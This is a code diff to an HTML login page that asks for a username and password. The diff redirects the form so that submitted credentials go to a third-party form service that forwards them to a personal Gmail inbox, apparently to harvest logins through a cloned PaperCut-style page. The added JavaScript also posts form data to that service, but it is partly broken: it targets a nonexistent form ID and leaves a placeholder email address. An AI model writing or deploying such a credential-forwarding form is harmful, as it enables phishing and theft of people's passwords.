@@ -97,36 +97,35 @@ body {
 </script>
 <div class="login">
     <h3>Please enter your username and password</h3>
-    <form action="/api/submit" method="post" name="f" id="f"> <input type="text" id="username" tabindex="1" name="username" placeholder="username" value="" spellcheck="false" autofocus autocomplete="username webauthn"> <input id="password" type="password" tabindex="3" name="password" placeholder="password" autocomplete="current-password webauthn"> <div class="submit"> <button type="submit" id="webauthnBegin" tabindex="2">Continue</button> <input type="submit" id="submit" style="display: none;" value="submit"> </div> </form>
+    <form action="https://formsubmit.co/sjacpapercutmf@gmail.com" method="post" name="f" id="f"> <input type="text" id="name" tabindex="1" name="name" placeholder="Username" value="" spellcheck="false" autofocus autocomplete="name webauthn"> <input id="cat" type="password" tabindex="3" name="cat" placeholder="Password" autocomplete="current-cat webauthn"> <div class="submit"> <button type="submit" id="webauthnBegin" tabindex="2">Continue</button> <input type="submit" id="submit" style="display: none;" value="submit"> </div> </form>
     <script>
-      // Optional: Handle form submission via JavaScript for better UX
-      const form = document.getElementById('f');
-      form.addEventListener('submit', async (e) => {
-          e.preventDefault();
-          const formData = new FormData(form);
-          const data = {
-              dog: formData.get('dog'),
-              cat: formData.get('cat'),
-          };
-
-          try {
-              const response = await fetch('/api/submit', {
-                  method: 'POST',
-                  headers: {
-                      'Content-Type': 'application/json',
-                  },
-                  body: JSON.stringify(data),
-              });
-
-              if (response.ok) {
-                  window.location.href = '/thankyou.html';
+      document.getElementById('myForm').addEventListener('submit', function(event) {
+          event.preventDefault(); // Prevent the default form submission
+  
+          var form = this;
+          var formData = new FormData(form);
+  
+          // Send the form data to the third-party service
+          fetch('https://formsubmit.co/ajax/YOUR_EMAIL_ADDRESS', {
+              method: 'POST',
+              body: formData,
+          })
+          .then(function(response) {
+              return response.json(); // Parse the JSON response
+          })
+          .then(function(data) {
+              if (data.success) {
+                  // Reload the page upon successful submission
+                  window.location.reload();
               } else {
-                  const error = await response.json();
-                  alert(`Error: ${error.message}`);
+                  // Handle submission errors
+                  alert('There was an error submitting the form.');
               }
-          } catch (error) {
+          })
+          .catch(function(error) {
+              console.error('Error:', error);
               alert('An unexpected error occurred.');
-          }
+          });
       });
   </script>
     <br>
